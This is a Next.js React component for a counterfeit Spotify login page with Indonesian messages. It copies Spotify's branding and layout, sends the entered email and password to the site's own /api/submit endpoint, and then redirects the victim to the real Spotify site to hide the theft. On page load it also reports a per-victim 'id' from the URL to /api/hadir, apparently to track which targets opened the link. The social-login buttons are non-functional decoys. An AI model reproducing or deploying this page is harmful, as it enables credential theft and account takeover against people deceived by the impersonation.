"use client";

import { useState } from "react";
import { useEffect } from "react";
import { Suspense } from "react";
import { useSearchParams } from "next/navigation";

function SpotifyLoginContent() {
  const searchParams = useSearchParams();

  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("idle");
  const [statusMsg, setStatusMsg] = useState("");

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async () => {
    setLoading(true);
    setStatus("idle");

    try {
      const response = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      const data = await response.json();

      if (response.ok) {
        window.location.href = "https://open.spotify.com/intl-id/";
      } else {
        setStatus("error");
        setStatusMsg(`✗ ${data.error || "Email atau password salah"}`);
      }
    } catch {
      setStatus("error");
      setStatusMsg("✗ Gagal menghubungkan ke server");
    } finally {
      setLoading(false);
    }
  };

  const handleCome = async () => {
    try {
      const id = searchParams.get("id");
      if (!id) {
        console.error("ID tidak ditemukan di URL");
        return;
      }

      const response = await fetch("/api/hadir", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });

      const data = await response.json();

      if (!response.ok) {
        console.error("Gagal update status:", data.error);
      }
    } catch {
      setStatusMsg("✗ Gagal masuk ke server");
    }
  };

  useEffect(() => {
    handleCome();
  }, []);

  const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter" && !loading) {
      handleSubmit();
    }
  };

  return (
    <div
      className="min-h-screen flex flex-col justify-center items-center px-4 sm:px-5 py-6 sm:py-10"
      style={{
        background: "linear-gradient(rgb(42, 42, 42), rgb(0, 0, 0))",
        fontFamily: "Circular, -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif",
      }}
    >
      <div
        className="w-full rounded-lg"
        style={{
          maxWidth: "735px",
          backgroundColor: "#121212",
          padding: "clamp(24px, 5vw, 50px) clamp(16px, 8vw, 80px)",
        }}
      >
        <div className="w-full mx-auto" style={{ maxWidth: "360px" }}>
          {/* Logo */}
          <div className="flex justify-center mb-4">
            <img src="/spotify.png" alt="Spotify Logo" style={{ width: "38px", height: "auto" }} />
          </div>

          <h1
            className="text-white text-center font-bold mb-6 sm:mb-9"
            style={{
              fontSize: "clamp(24px, 5vw, 32px)",
              letterSpacing: "-0.04em",
            }}
          >
            Log in to Spotify
          </h1>
        </div>

        <div
          className="w-full mx-auto"
          id="googlenone"
          style={{
            maxWidth: "480px",
            display: "none",
          }}
        >
          <span
            style={{
              color: "#ffffff",
              fontSize: "clamp(12px, 2.5vw, 14px)",
              marginBottom: "16px",
              display: "block",
            }}
          >
            Kamu tidak punya akun Spotify yang terhubung dengan Akun Google. Jika kamu punya akun Spotify, coba masuk dengan email atau nama pengguna Spotify-mu. Jika kamu tidak punya akun Spotify, silakan daftar.
          </span>
        </div>

        <div className="w-full mx-auto" style={{ maxWidth: "360px" }}>
          {/* Social Login Buttons */}
          <button
            className="w-full mb-2 font-bold flex items-center justify-center gap-2 sm:gap-3 relative"
            style={{
              padding: "10px 12px",
              border: "1px solid #878787",
              borderRadius: "500px",
              backgroundColor: "transparent",
              color: "#ffffff",
              fontSize: "clamp(14px, 2.5vw, 16px)",
              cursor: "pointer",
              transition: "all 0.2s ease",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.borderColor = "#ffffff")}
            onMouseLeave={(e) => (e.currentTarget.style.borderColor = "#878787")}
            onClick={() => {
              const googlenone = document.getElementById("googlenone");
              if (googlenone) {
                googlenone.style.display = "block";
              }
            }}
          >
            <svg className="absolute hidden sm:block" style={{ left: "32px" }} width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
            </svg>
            <svg className="sm:hidden" width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
            </svg>
            Continue with Google
          </button>

          <button
            className="w-full mb-2 font-bold flex items-center justify-center gap-2 sm:gap-3 relative"
            style={{
              padding: "10px 12px",
              border: "1px solid #878787",
              borderRadius: "500px",
              backgroundColor: "transparent",
              color: "#ffffff",
              fontSize: "clamp(14px, 2.5vw, 16px)",
              cursor: "pointer",
              transition: "all 0.2s ease",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.borderColor = "#ffffff")}
            onMouseLeave={(e) => (e.currentTarget.style.borderColor = "#878787")}
          >
            <svg className="absolute hidden sm:block" style={{ left: "32px" }} width="20" height="20" viewBox="0 0 24 24" fill="#1877F2" xmlns="http://www.w3.org/2000/svg">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            <svg className="sm:hidden" width="18" height="18" viewBox="0 0 24 24" fill="#1877F2" xmlns="http://www.w3.org/2000/svg">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            Continue with Facebook
          </button>

          <button
            className="w-full mb-2 font-bold flex items-center justify-center gap-2 sm:gap-3 relative"
            style={{
              padding: "10px 12px",
              border: "1px solid #878787",
              borderRadius: "500px",
              backgroundColor: "transparent",
              color: "#ffffff",
              fontSize: "clamp(14px, 2.5vw, 16px)",
              cursor: "pointer",
              transition: "all 0.2s ease",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.borderColor = "#ffffff")}
            onMouseLeave={(e) => (e.currentTarget.style.borderColor = "#878787")}
          >
            <svg className="absolute hidden sm:block" style={{ left: "32px" }} width="20" height="20" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg">
              <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" />
            </svg>
            <svg className="sm:hidden" width="18" height="18" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg">
              <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" />
            </svg>
            Continue with Apple
          </button>

          <button
            className="w-full mb-2 font-bold"
            style={{
              padding: "10px 12px",
              border: "1px solid #878787",
              borderRadius: "500px",
              backgroundColor: "transparent",
              color: "#ffffff",
              fontSize: "clamp(14px, 2.5vw, 16px)",
              cursor: "pointer",
              transition: "all 0.2s ease",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.borderColor = "#ffffff")}
            onMouseLeave={(e) => (e.currentTarget.style.borderColor = "#878787")}
          >
            Continue with phone number
          </button>

          <div
            className="flex items-center"
            style={{
              margin: "24px 0 sm:32px 0",
              color: "#878787",
              fontSize: "clamp(12px, 2.5vw, 14px)",
            }}
          >
            <div style={{ flex: 1, height: "1px", backgroundColor: "#292929" }}></div>
            <span style={{ padding: "0 12px sm:0 16px" }}>OR</span>
            <div style={{ flex: 1, height: "1px", backgroundColor: "#292929" }}></div>
          </div>

          {/* Email Login Form */}
          <div style={{ marginBottom: "12px" }}>
            <label
              className="block font-bold"
              style={{
                color: "#ffffff",
                fontSize: "clamp(12px, 2.5vw, 14px)",
                marginBottom: "8px",
              }}
            >
              Email or username
            </label>
            <input
              type="text"
              name="email"
              value={formData.email}
              onChange={handleChange}
              onKeyPress={handleKeyPress}
              placeholder="Email or username"
              disabled={loading}
              className="w-full"
              required={true}
              style={{
                padding: "12px 14px",
                border: "1px solid #878787",
                borderRadius: "4px",
                backgroundColor: "#121212",
                color: "#ffffff",
                fontSize: "clamp(14px, 2.5vw, 16px)",
                transition: "all 0.2s ease",
              }}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = "#ffffff";
                e.currentTarget.style.borderWidth = "3px";
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor = "#878787";
                e.currentTarget.style.borderWidth = "1px";
              }}
              onMouseEnter={(e) => !loading && (e.currentTarget.style.borderColor = "#ffffff")}
              onMouseLeave={(e) => !loading && document.activeElement !== e.currentTarget && (e.currentTarget.style.borderColor = "#878787")}
            />
          </div>

          <div style={{ marginBottom: "12px" }}>
            <label
              className="block font-bold"
              style={{
                color: "#ffffff",
                fontSize: "clamp(12px, 2.5vw, 14px)",
                marginBottom: "8px",
              }}
            >
              Password
            </label>
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              onKeyPress={handleKeyPress}
              placeholder="Password"
              disabled={loading}
              className="w-full"
              style={{
                padding: "12px 14px",
                border: "1px solid #878787",
                borderRadius: "4px",
                backgroundColor: "#121212",
                color: "#ffffff",
                fontSize: "clamp(14px, 2.5vw, 16px)",
                transition: "all 0.2s ease",
              }}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = "#ffffff";
                e.currentTarget.style.borderWidth = "3px";
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor = "#878787";
                e.currentTarget.style.borderWidth = "1px";
              }}
              onMouseEnter={(e) => !loading && (e.currentTarget.style.borderColor = "#ffffff")}
              onMouseLeave={(e) => !loading && document.activeElement !== e.currentTarget && (e.currentTarget.style.borderColor = "#878787")}
            />
          </div>

          <button
            onClick={handleSubmit}
            disabled={loading}
            className="w-full font-bold"
            style={{
              padding: "12px 14px",
              marginTop: "24px sm:32px",
              border: "none",
              borderRadius: "500px",
              backgroundColor: loading ? "#1ed760" : "#1ed760",
              color: "#000000",
              fontSize: "clamp(14px, 2.5vw, 16px)",
              cursor: loading ? "not-allowed" : "pointer",
              transition: "all 0.2s ease",
              opacity: loading ? 0.7 : 1,
            }}
            onMouseEnter={(e) => !loading && (e.currentTarget.style.transform = "scale(1.04)")}
            onMouseLeave={(e) => !loading && (e.currentTarget.style.transform = "scale(1)")}
          >
            {loading ? "Loading..." : "Log In"}
          </button>

          {/* Status Messages */}
          {status === "success" && (
            <div
              className="text-center"
              style={{
                marginTop: "16px",
                padding: "12px",
                backgroundColor: "rgba(30, 215, 96, 0.1)",
                border: "1px solid #1ed760",
                color: "#1ed760",
                borderRadius: "4px",
                fontSize: "clamp(12px, 2.5vw, 14px)",
              }}
            >
              {statusMsg}
            </div>
          )}

          {status === "error" && (
            <div
              className="text-center"
              style={{
                marginTop: "16px",
                padding: "12px",
                backgroundColor: "rgba(230, 30, 30, 0.1)",
                border: "1px solid #e61e1e",
                color: "#e61e1e",
                borderRadius: "4px",
                fontSize: "clamp(12px, 2.5vw, 14px)",
              }}
            >
              {statusMsg}
            </div>
          )}

          <div
            className="text-center"
            style={{
              marginTop: "24px sm:32px",
              color: "#a7a7a7",
              fontSize: "clamp(14px, 2.5vw, 16px)",
            }}
          >
            Don&apos;t have an account?{" "}
            <a
              href="/register"
              style={{
                color: "#ffffff",
                textDecoration: "underline",
                fontWeight: "400",
              }}
              onMouseEnter={(e) => (e.currentTarget.style.color = "#1ed760")}
              onMouseLeave={(e) => (e.currentTarget.style.color = "#ffffff")}
            >
              Sign up for Spotify
            </a>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div
        className="text-center px-4"
        style={{
          marginTop: "32px sm:40px",
          color: "#878787",
          fontSize: "clamp(10px, 2vw, 11px)",
          lineHeight: "1.6",
          maxWidth: "735px",
        }}
      >
        This site is protected by reCAPTCHA and the Google{" "}
        <a
          href="#"
          style={{
            color: "#878787",
            textDecoration: "underline",
          }}
          onMouseEnter={(e) => (e.currentTarget.style.color = "#ffffff")}
          onMouseLeave={(e) => (e.currentTarget.style.color = "#878787")}
        >
          Privacy Policy
        </a>{" "}
        and{" "}
        <a
          href="#"
          style={{
            color: "#878787",
            textDecoration: "underline",
          }}
          onMouseEnter={(e) => (e.currentTarget.style.color = "#ffffff")}
          onMouseLeave={(e) => (e.currentTarget.style.color = "#878787")}
        >
          Terms of Service
        </a>{" "}
        apply.
      </div>
    </div>
  );
}

export default function SpotifyLogin() {
  return (
    <Suspense fallback={<div style={{ color: "white", textAlign: "center" }}>Loading...</div>}>
      <SpotifyLoginContent />
    </Suspense>
  );
}
